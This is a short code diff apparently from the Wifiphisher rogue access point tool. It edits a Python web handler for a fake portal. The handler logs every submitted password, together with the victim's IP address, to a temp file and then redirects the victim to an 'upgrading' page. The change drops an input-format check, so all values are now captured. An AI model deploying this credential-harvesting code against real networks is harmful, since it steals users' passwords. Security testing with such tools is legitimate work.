@@ -247,19 +247,18 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                      })
         for item in form.list:
             if item.value:
-                if re.match("\A[\x20-\x7e] + \Z", item.value):
-                    self.send_response(301)
-                    self.send_header('Location', '/upgrading.html')
-                    self.end_headers()
-                    wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
-                    with open(wifi_webserver_tmp, "a + ") as log_file:
-                        log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
-                                       T + self.client_address[0] +
-                                       R + " password=" + item.value +
-                                       W + "\n"
-                                       )
-                        log_file.close()
-                    return
+                self.send_response(301)
+                self.send_header('Location', '/upgrading.html')
+                self.end_headers()
+                wifi_webserver_tmp = "/tmp/wifiphisher-webserver.tmp"
+                with open(wifi_webserver_tmp, "a + ") as log_file:
+                    log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
+                                   T + self.client_address[0] +
+                                   R + " password=" + item.value +
+                                   W + "\n"
+                                   )
+                    log_file.close()
+                return
 
     def log_message(self, format, *args):
         return
